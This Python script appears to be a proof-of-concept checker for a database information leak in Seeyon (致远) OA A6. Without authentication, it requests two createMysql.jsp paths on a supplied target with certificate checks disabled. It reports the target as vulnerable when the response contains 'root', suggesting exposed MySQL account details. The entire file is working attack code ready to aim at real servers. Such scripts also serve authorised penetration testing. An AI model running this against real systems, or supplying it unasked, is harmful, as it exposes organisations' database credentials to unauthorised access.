import time
import requests
import urllib3
from rich.console import Console

console = Console()


def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    vuln_url = target_url + "yyoa/ext/createMysql.jsp"
    vuln_url2 =target_url + "yyoa/createMysql.jsp"
    console.print(now_time() + " [INFO]     正在检测致远OA A6 createMysql.jsp 数据库敏感信息泄露漏洞", style='bold blue')
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
    }
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(vuln_url, headers=headers, verify=False)
        response2 = requests.get(vuln_url2, headers=headers, verify=False)
        if 'root' in response.text and response.status_code == 200:
            console.print(now_time() + " [SUCCESS]  致远OA A6 存在敏感信息泄露,地址为:{}".format(vuln_url), style='bold green')
        elif 'root' in response2.text and response2.status_code == 200:
            console.print(now_time() + " [SUCCESS]  致远OA A6 存在敏感信息泄露,地址为:{}".format(vuln_url2), style='bold green')
        else:
            console.print(now_time() + " [WARNING]  致远OA A6 createMysql.jsp 数据库敏感信息泄露漏洞利用失败", style='bold red')
    except:
        console.print(now_time() + " [ERROR]    目标请求失败 ", style='bold red')


